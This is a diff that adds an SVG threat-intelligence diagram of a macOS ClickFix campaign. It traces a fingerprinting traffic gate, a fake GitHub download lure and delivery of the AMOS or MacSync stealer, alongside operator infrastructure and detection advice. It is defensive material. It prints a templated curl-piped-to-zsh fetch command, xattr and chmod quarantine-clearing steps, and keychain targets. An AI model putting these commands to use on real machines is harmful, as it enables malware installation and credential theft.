@@ -1,0 +1,248 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 880 1280" role="img" aria-labelledby="t d">
+<title id="t">macOS ClickFix TDS fingerprinting-gate kill chain</title>
+<desc id="d">Two-lane kill chain. Left lane is the victim path: a gated web visit to an algorithmically named file-word-word front-end domain returns a small JavaScript profiler; the fingerprint gate reads navigator, screen, WebGL, timezone, iframe and touch signals and runs devtools and canPlayType tripwires, tagging the submission mode php; qualifying Macs get a GitHub-themed Download for macOS lure with a forged Verified Publisher badge and a copy-to-Terminal curl one-liner; the user pastes it, curl pulls staged scripts from a slash curl slash id path, base64 and gunzip decode them and xattr minus c plus chmod plus x prepare the payload; Atomic Stealer or MacSync then steals Keychain, browser and wallet data and exfiltrates over HTTP POST. Right lane is the operator infrastructure: domain generation of 250-plus disposable front-ends, the server-side Traffic Distribution System gate that evaluates the submitted fingerprint and selects who sees the lure, a decoy branch for bots and non-macOS visitors, a staging host serving the curl scripts and AMOS, and a collection endpoint receiving exfiltration. Detection anchors: the gate artifacts served in the clear, and the curl-piped-to-shell Terminal execution.</desc>
+<defs>
+<style><![CDATA[
+.bg { fill: #ffffff; }
+.head { font: 700 18px sans-serif; fill: #0a0a0a; }
+.meta { font: 11px sans-serif; fill: #404040; }
+.laneL { fill: #f3f7fb; stroke: #5a7da6; stroke-width: 1.2; }
+.laneR { fill: #faf3ee; stroke: #b07a3a; stroke-width: 1.2; }
+.laneLabelL { font: 700 12px sans-serif; fill: #2a4a6a; }
+.laneLabelR { font: 700 12px sans-serif; fill: #8a5520; }
+.stage { fill: #ffffff; stroke: #5a7da6; stroke-width: 1.1; }
+.stageK { fill: #fdecec; stroke: #b03030; stroke-width: 1.4; }
+.op { fill: #ffffff; stroke: #b07a3a; stroke-width: 1.1; }
+.opK { fill: #fdecec; stroke: #b03030; stroke-width: 1.4; }
+.band { fill: #f7f1eb; stroke: #c08555; stroke-width: 1.2; }
+.badge { fill: #5a7da6; }
+.badgeK { fill: #b03030; }
+.badgeR { fill: #b07a3a; }
+.badgeText { font: 700 12px sans-serif; fill: #ffffff; text-anchor: middle; }
+.label { font: 700 13px sans-serif; fill: #0a0a0a; }
+.sub { font: 11px sans-serif; fill: #303030; }
+.mono { font: 10.5px ui-monospace, "SFMono-Regular", Consolas, monospace; fill: #303030; }
+.footer { fill: #f6f6f4; stroke: #888; stroke-width: 1; }
+.footerH { font: 700 12px sans-serif; fill: #1a1a1a; }
+.footerT { font: 10.5px sans-serif; fill: #1a1a1a; }
+.arrow { stroke: #2a4a6a; stroke-width: 1.6; fill: none; }
+.arrowX { stroke: #7a3a7a; stroke-width: 1.6; fill: none; stroke-dasharray: 5 3; }
+.arrowR { stroke: #8a5520; stroke-width: 1.6; fill: none; }
+.acc-ransomware { fill: #b03030; }
+.acc-espionage { fill: #2a4a6a; }
+.acc-supply-chain { fill: #b07a3a; }
+.acc-identity-cloud { fill: #6a4ca6; }
+.acc-ot-ics { fill: #2f8f4e; }
+.acc-edge-network { fill: #1d7a8c; }
+.acc-mobile { fill: #c2569a; }
+.acc-crypto-defi { fill: #d08a1f; }
+.acc-malware-re { fill: #556070; }
+.acc-other { fill: #6a6a6a; }
+.accLabel { font: 700 11px sans-serif; fill: #ffffff; }
+@media (prefers-color-scheme: dark) {
+  .bg { fill: #0d1117; }
+  .head, .label, .footerH { fill: #f0f0f0; }
+  .meta, .sub, .footerT { fill: #c8c8c8; }
+  .mono { fill: #c0d0e0; }
+  .laneL { fill: #182230; stroke: #7aa6d0; }
+  .laneR { fill: #2a2418; stroke: #d09a5a; }
+  .laneLabelL { fill: #a8c6e2; }
+  .laneLabelR { fill: #e2bf8a; }
+  .stage { fill: #1c2530; stroke: #7aa6d0; }
+  .stageK { fill: #3a1818; stroke: #e06060; }
+  .op { fill: #2a2418; stroke: #d09a5a; }
+  .opK { fill: #3a1818; stroke: #e06060; }
+  .band { fill: #2a2418; stroke: #d09a5a; }
+  .badge { fill: #7aa6d0; }
+  .badgeK { fill: #e06060; }
+  .badgeR { fill: #d09a5a; }
+  .badgeText { fill: #0d1117; }
+  .footer { fill: #1a1d22; stroke: #555; }
+  .arrow { stroke: #a8c6e2; }
+  .arrowX { stroke: #c898d0; }
+  .arrowR { stroke: #e2bf8a; }
+}
+]]></style>
+<marker id="ah" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto">
+  <path d="M0,0 L10,5 L0,10 z" fill="currentColor"/>
+</marker>
+</defs>
+<rect class="bg" x="0" y="0" width="880" height="1280"/>
+<rect class="acc-other" x="0" y="0" width="880" height="8"/>
+<text class="head" x="20" y="36">Cloaked ClickFix: a macOS ClickFix TDS fingerprinting gate delivering AMOS</text>
+<text class="meta" x="20" y="58">Vendor: Microsoft Threat Intelligence - Date: 2026-08-05 - Cluster: Unattributed macOS ClickFix TDS operator - Day 102</text>
+
+<rect class="laneL" x="20" y="85" width="410" height="1080"/>
+<rect class="laneR" x="450" y="85" width="410" height="1080"/>
+<text class="laneLabelL" x="30" y="103">Victim - browser to Terminal</text>
+<text class="laneLabelR" x="460" y="103">Operator - domains, TDS gate, staging</text>
+
+<!-- Left stage 1 -->
+<rect class="stage" x="30" y="120" width="395" height="135"/>
+<circle class="badge" cx="50" cy="140" r="14"/>
+<text class="badgeText" x="50" y="144">1</text>
+<text class="label" x="74" y="144">Gated web visit</text>
+<text class="sub" x="40" y="168">Front-end domain returns only a ~2.5 KB JS profiler.</text>
+<text class="sub" x="40" y="184">Blank or parked to crawlers and sandboxes.</text>
+<text class="sub" x="40" y="200">file-word-word disposable domain family.</text>
+<text class="mono" x="40" y="226">filecopperbasket[.]sbs</text>
+<text class="mono" x="40" y="244">T1189 Drive-by Compromise</text>
+
+<!-- Left stage 2 -->
+<rect class="stage" x="30" y="270" width="395" height="135"/>
+<circle class="badge" cx="50" cy="290" r="14"/>
+<text class="badgeText" x="50" y="294">2</text>
+<text class="label" x="74" y="294">Fingerprint gate</text>
+<text class="sub" x="40" y="318">Reads navigator, screen, WebGL, timezone, touch.</text>
+<text class="sub" x="40" y="334">Devtools toString counter + canPlayType tripwire.</text>
+<text class="sub" x="40" y="350">Submits tagged fingerprint to the server.</text>
+<text class="mono" x="40" y="376">mode:"php"</text>
+<text class="mono" x="40" y="394">T1497.001 - T1622 - T1480</text>
+
+<!-- Left stage 3 -->
+<rect class="stage" x="30" y="420" width="395" height="135"/>
+<circle class="badge" cx="50" cy="440" r="14"/>
+<text class="badgeText" x="50" y="444">3</text>
+<text class="label" x="74" y="444">ClickFix lure shown</text>
+<text class="sub" x="40" y="468">GitHub-themed "Download for macOS" page.</text>
+<text class="sub" x="40" y="484">Forged "Verified Publisher" badge.</text>
+<text class="sub" x="40" y="500">One-click Copy of an obfuscated curl one-liner.</text>
+<text class="mono" x="40" y="526">T1656 Impersonation</text>
+<text class="mono" x="40" y="544">T1036.005 Masquerading</text>
+
+<!-- Left stage 4 -->
+<rect class="stage" x="30" y="570" width="395" height="135"/>
+<circle class="badge" cx="50" cy="590" r="14"/>
+<text class="badgeText" x="50" y="594">4</text>
+<text class="label" x="74" y="594">Paste into Terminal</text>
+<text class="sub" x="40" y="618">User pastes and runs the copied command.</text>
+<text class="sub" x="40" y="634">curl piped to a shell; no app-bundle trust path.</text>
+<text class="sub" x="40" y="650">Bypasses quarantine, Gatekeeper, notarization.</text>
+<text class="mono" x="40" y="676">curl -fsSL https://.../curl/&lt;id&gt; | zsh</text>
+<text class="mono" x="40" y="694">T1204.004 - T1059.004</text>
+
+<!-- Left stage 5 -->
+<rect class="stage" x="30" y="720" width="395" height="135"/>
+<circle class="badge" cx="50" cy="740" r="14"/>
+<text class="badgeText" x="50" y="744">5</text>
+<text class="label" x="74" y="744">Staged retrieval</text>
+<text class="sub" x="40" y="768">curl pulls multi-stage scripts from /curl/&lt;id&gt;.</text>
+<text class="sub" x="40" y="784">base64 -d and gunzip decode the blob.</text>
+<text class="sub" x="40" y="800">Quarantine cleared, payload made executable.</text>
+<text class="mono" x="40" y="826">xattr -c ; chmod +x &lt;payload&gt;</text>
+<text class="mono" x="40" y="844">T1105 - T1140 - T1553.001</text>
+
+<!-- Left stage 6 (critical) -->
+<rect class="stageK" x="30" y="870" width="395" height="135"/>
+<circle class="badgeK" cx="50" cy="890" r="14"/>
+<text class="badgeText" x="50" y="894">6</text>
+<text class="label" x="74" y="894">Infostealer runs</text>
+<text class="sub" x="40" y="918">AMOS (Atomic Stealer) or MacSync launched.</text>
+<text class="sub" x="40" y="934">Keychain, browser stores, cookies, wallets.</text>
+<text class="sub" x="40" y="950">Data staged into an archive.</text>
+<text class="mono" x="40" y="976">login.keychain-db</text>
+<text class="mono" x="40" y="994">T1555.001 - T1555.003 - T1539</text>
+
+<!-- Left stage 7 -->
+<rect class="stage" x="30" y="1020" width="395" height="135"/>
+<circle class="badge" cx="50" cy="1040" r="14"/>
+<text class="badgeText" x="50" y="1044">7</text>
+<text class="label" x="74" y="1044">Exfiltration</text>
+<text class="sub" x="40" y="1068">Collected archive sent to the collection host.</text>
+<text class="sub" x="40" y="1084">HTTP POST over the C2 channel.</text>
+<text class="sub" x="40" y="1100">Credential compromise assumed if reached.</text>
+<text class="mono" x="40" y="1126">HTTP POST -&gt; collection endpoint</text>
+<text class="mono" x="40" y="1144">T1041 Exfiltration Over C2</text>
+
+<!-- Right op 1 -->
+<rect class="op" x="460" y="125" width="395" height="155"/>
+<circle class="badgeR" cx="480" cy="145" r="14"/>
+<text class="badgeText" x="480" y="149">A</text>
+<text class="label" x="504" y="149">Domain generation</text>
+<text class="sub" x="470" y="173">250+ file-word-word front-end domains.</text>
+<text class="sub" x="470" y="189">Dictionary-word tokens; disposable, rotating.</text>
+<text class="sub" x="470" y="205">Naming is a hunting pivot, not a signature.</text>
+<text class="sub" x="470" y="221">Some omit the file token entirely.</text>
+<text class="mono" x="470" y="246">applefilevault[.]com - cloudsendhub[.]com</text>
+<text class="mono" x="470" y="264">T1583.001 - T1608</text>
+
+<!-- Right op 2 -->
+<rect class="op" x="460" y="295" width="395" height="155"/>
+<circle class="badgeR" cx="480" cy="315" r="14"/>
+<text class="badgeText" x="480" y="319">B</text>
+<text class="label" x="504" y="319">TDS gate (server-side)</text>
+<text class="sub" x="470" y="343">Evaluates the submitted fingerprint.</text>
+<text class="sub" x="470" y="359">Selects who sees the ClickFix lure.</text>
+<text class="sub" x="470" y="375">On-demand, per-request victim qualification.</text>
+<text class="sub" x="470" y="391">Hides infrastructure from crawlers.</text>
+<text class="mono" x="470" y="416">fingerprint submit mode:"php"</text>
+<text class="mono" x="470" y="434">T1480 Execution Guardrails</text>
+
+<!-- Right op 3 -->
+<rect class="op" x="460" y="465" width="395" height="155"/>
+<circle class="badgeR" cx="480" cy="485" r="14"/>
+<text class="badgeText" x="480" y="489">C</text>
+<text class="label" x="504" y="489">Decoy branch</text>
+<text class="sub" x="470" y="513">Bots, sandboxes, VMs, non-macOS visitors.</text>
+<text class="sub" x="470" y="529">Get a blank, parked, or benign decoy page.</text>
+<text class="sub" x="470" y="545">e.g. fake Urban VPN or logistics site.</text>
+<text class="sub" x="470" y="561">Benign response does not mean domain is safe.</text>
+<text class="mono" x="470" y="586">per-request server-side decision</text>
+<text class="mono" x="470" y="604">T1497 Sandbox Evasion</text>
+
+<!-- Right op 4 -->
+<rect class="op" x="460" y="635" width="395" height="155"/>
+<circle class="badgeR" cx="480" cy="655" r="14"/>
+<text class="badgeText" x="480" y="659">D</text>
+<text class="label" x="504" y="659">Staging host</text>
+<text class="sub" x="470" y="683">Serves the multi-stage macOS scripts.</text>
+<text class="sub" x="470" y="699">Delivers AMOS / MacSync at the end.</text>
+<text class="sub" x="470" y="715">Shared back end behind many front-ends.</text>
+<text class="sub" x="470" y="731">Block here, not on disposable domains.</text>
+<text class="mono" x="470" y="756">GET /curl/&lt;hex-id&gt;</text>
+<text class="mono" x="470" y="774">T1105 Ingress Tool Transfer</text>
+
+<!-- Right op 5 (critical) -->
+<rect class="opK" x="460" y="805" width="395" height="155"/>
+<circle class="badgeK" cx="480" cy="825" r="14"/>
+<text class="badgeText" x="480" y="829">E</text>
+<text class="label" x="504" y="829">Collection endpoint</text>
+<text class="sub" x="470" y="853">Receives the HTTP POST exfiltration.</text>
+<text class="sub" x="470" y="869">Keychain, browser, cookie, wallet data.</text>
+<text class="sub" x="470" y="885">Durable network artifact for blocking.</text>
+<text class="sub" x="470" y="901">Rotate all reachable credentials.</text>
+<text class="mono" x="470" y="926">HTTP POST inbound (attacker view)</text>
+<text class="mono" x="470" y="944">T1041 Exfiltration Over C2</text>
+
+<!-- Right op 6 -->
+<rect class="op" x="460" y="975" width="395" height="155"/>
+<circle class="badgeR" cx="480" cy="995" r="14"/>
+<text class="badgeText" x="480" y="999">F</text>
+<text class="label" x="504" y="999">Payload families</text>
+<text class="sub" x="470" y="1023">AMOS (Atomic Stealer) and MacSync.</text>
+<text class="sub" x="470" y="1039">Commodity macOS infostealers; rotate often.</text>
+<text class="sub" x="470" y="1055">Not an attribution signal for this cluster.</text>
+<text class="sub" x="470" y="1071">Rarely observed due to gated delivery.</text>
+<text class="mono" x="470" y="1096">no payload hashes published</text>
+<text class="mono" x="470" y="1114">hunt the gate, not the payload</text>
+
+<!-- Left-lane vertical flow arrows -->
+<path class="arrow" d="M225 255 L225 270" marker-end="url(#ah)"/>
+<path class="arrow" d="M225 405 L225 420" marker-end="url(#ah)"/>
+<path class="arrow" d="M225 555 L225 570" marker-end="url(#ah)"/>
+<path class="arrow" d="M225 705 L225 720" marker-end="url(#ah)"/>
+<path class="arrow" d="M225 855 L225 870" marker-end="url(#ah)"/>
+<path class="arrow" d="M225 1005 L225 1020" marker-end="url(#ah)"/>
+
+<!-- Cross-lane arrows (purple dashed) -->
+<path class="arrowX" d="M460 190 L425 190" marker-end="url(#ah)"/>
+<path class="arrowX" d="M425 345 L460 345" marker-end="url(#ah)"/>
+<path class="arrowX" d="M460 760 L425 760" marker-end="url(#ah)"/>
+<path class="arrowX" d="M425 900 L460 900" marker-end="url(#ah)"/>
+
+<rect class="footer" x="20" y="1175" width="840" height="95"/>
+<text class="footerH" x="34" y="1200">Detection anchors</text>
+<text class="footerT" x="34" y="1222">Gate artifacts served in the clear: self-submitting fingerprint form, hidden fields, mode:"php", file-word-word naming.</text>
+<text class="footerT" x="34" y="1240">Endpoint: browser/Terminal-parented curl on a /curl/ path piped into a shell; then Keychain/browser access + HTTP POST exfil.</text>
+<text class="footerT" x="34" y="1258">No CVE in scope (social engineering + TDS cloaking). Block on shared staging and /curl/ paths, not on disposable front-ends.</text>
+</svg>
